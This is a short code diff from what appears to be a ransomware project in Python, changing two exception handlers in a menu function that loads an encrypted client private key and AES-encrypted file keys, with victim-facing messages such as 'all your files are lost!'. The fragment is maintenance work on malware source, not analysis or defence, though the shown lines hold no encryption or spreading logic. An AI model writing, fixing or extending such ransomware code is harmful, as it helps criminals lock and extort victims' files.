@@ -118,7 +118,7 @@ def menu():
     try:
         with open(ransomware_path + '/encrypted_client_private_key.key', 'rb') as f:
             encrypted_client_private_key = pickle.load(f)
-    except FileNotFoundError:
+    except IOError:
         print("encrypted client private key not found, I'm sorry. but all your files are lost!")
         sys.exit(-1)
 
@@ -145,7 +145,7 @@ def menu():
     try:
         with open(ransomware_path + "/AES_encrypted_keys.txt") as f:
             content = f.read()
-    except FileNotFoundError:
+    except IOError:
         print("AES keys not found. Sorry but all your files are lost!")
         sys.exit(-1)
 
